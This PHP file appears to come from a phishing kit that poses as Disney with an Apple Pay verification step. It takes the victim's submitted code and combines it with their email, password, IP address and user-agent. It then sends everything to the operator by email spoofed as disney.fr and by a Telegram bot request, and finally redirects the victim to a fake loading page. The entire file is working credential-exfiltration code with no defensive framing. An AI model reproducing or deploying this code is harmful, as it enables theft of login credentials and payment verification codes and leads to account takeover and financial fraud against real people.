<?php
include("../settings.php");
include("../common/sub_includes.php");


if(isset($_POST)){

	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['code'] = htmlspecialchars($_POST['code']);


	if(isset($_SESSION["password"])){

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "
[💿] Apple Pay [💿]

💿 Code : ".$_SESSION['code']."

[📲] Login [📲]

📲 Email : ".$_SESSION['email']."
📲 Mot de passe : ".$_SESSION['password']."

[💻] Informations additionnelles [💻]

💻 IP : ".$_SESSION['ip']."
💻 User-agent : ".$_SESSION['useragent']."

					";

					$subject = "「💿」 +1 ApplePay | ".$_SESSION['code']." - ".$_SESSION['ip'];
					$headers = "From: Disney <jugular@disney.fr>";

					mail($rezmail, $subject, $message, $headers);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '
[💿] Apple Pay [💿]

💿 Code : '.$_SESSION['code'].'

[📲] Login [📲]

📲 E-Mail : '.$_SESSION['email'].'
📲 Mot de passe : '.$_SESSION['password'].'

[💻] Informations additionnelles [💻]

💻 Adresse Ip : '.$_SESSION['ip'].'
💻 User-agent : '.$_SESSION['useragent'].'


					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}
				$_SESSION["logged"] = true;
				header("location: ../steps/loading_finished.php")

				echo json_encode(array('success' => 1));
				}
		else{

			echo json_encode(array('success' => 0));

		}

	}

else{
	header('Location: ../');
}


?>